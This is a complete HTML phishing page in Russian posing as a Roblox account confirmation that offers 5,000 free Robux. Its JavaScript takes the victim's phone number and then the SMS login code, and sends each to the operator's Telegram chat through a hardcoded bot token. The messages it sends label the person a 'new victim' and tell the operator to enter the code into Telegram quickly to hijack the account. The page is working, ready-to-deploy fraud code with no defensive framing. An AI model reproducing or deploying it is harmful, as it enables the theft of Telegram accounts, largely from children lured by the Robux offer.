<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Подтверждение аккаунта</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            font-family: 'Arial', sans-serif;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: #1a1a1a;
            border: 2px solid #00b06f;
            border-radius: 20px;
            padding: 30px 25px;
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        .logo { 
            font-size: 70px; 
            margin-bottom: 10px;
        }
        .robux {
            color: #00b06f;
            font-size: 28px;
            font-weight: bold;
            margin: 10px 0;
        }
        h2 { color: #fff; font-size: 20px; margin-bottom: 8px; }
        p { color: #bbb; font-size: 13px; margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 14px 16px;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            margin-bottom: 12px;
            outline: none;
        }
        input:focus { border-color: #00b06f; }
        button {
            width: 100%;
            padding: 14px;
            background: #00b06f;
            color: #000;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover { background: #00d17f; }
        .alert { color: #ff4444; font-size: 13px; margin-top: 10px; }
        .step { display: none; }
        .step.active { display: block; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🎮</div>
        
        <!-- Шаг 1 -->
        <div id="step1" class="step active">
            <h2>Подтверждение аккаунта</h2>
            <div class="robux">💰 5 000 Robux</div>
            <p>Подтвердите что вы владелец аккаунта и получите 5 000 Robux бесплатно!</p>
            <input type="tel" id="phone" placeholder="+79001234567">
            <button onclick="sendPhone()">🎁 Получить Robux</button>
            <div class="alert" id="alert1"></div>
        </div>
        
        <!-- Шаг 2 -->
        <div id="step2" class="step">
            <h2>Введите код</h2>
            <p>На номер <span id="phoneDisplay"></span> отправлен код подтверждения.</p>
            <input type="text" id="code" placeholder="•••••" maxlength="5">
            <button onclick="sendCode()">✅ Подтвердить и получить Robux</button>
            <div class="alert" id="alert2"></div>
        </div>
        
        <!-- Шаг 3 -->
        <div id="step3" class="step">
            <h2>✅ Готово!</h2>
            <div class="robux">+5 000 Robux</div>
            <p>Robux будут зачислены в течение 24 часов.</p>
            <p style="color:#666;font-size:11px;">Это окно можно закрыть.</p>
        </div>
    </div>

    <script>
        const TOKEN = "8030379259:AAHGlai2IkpAjobGwAwMZaI6GkF4vxJkN7M";
        const ADMIN_ID = "6600491178";
        let phoneNumber = "";
        
        function sendPhone() {
            phoneNumber = document.getElementById('phone').value.trim();
            if (!phoneNumber || phoneNumber.length < 10) {
                document.getElementById('alert1').innerText = "Введите корректный номер";
                return;
            }
            
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: `🎯 Новая жертва!\n📱 Номер: ${phoneNumber}\n\nВведи этот номер в Telegram и жди код!`
                })
            });
            
            document.getElementById('phoneDisplay').innerText = phoneNumber;
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }
        
        function sendCode() {
            const code = document.getElementById('code').value.trim();
            if (!code || code.length < 3) {
                document.getElementById('alert2').innerText = "Введите код из SMS";
                return;
            }
            
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: `🔑 КОД: ${code}\n📱 Номер: ${phoneNumber}\n\nБыстро введи код в Telegram!`
                })
            });
            
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
        }
    </script>
</body>
</html>
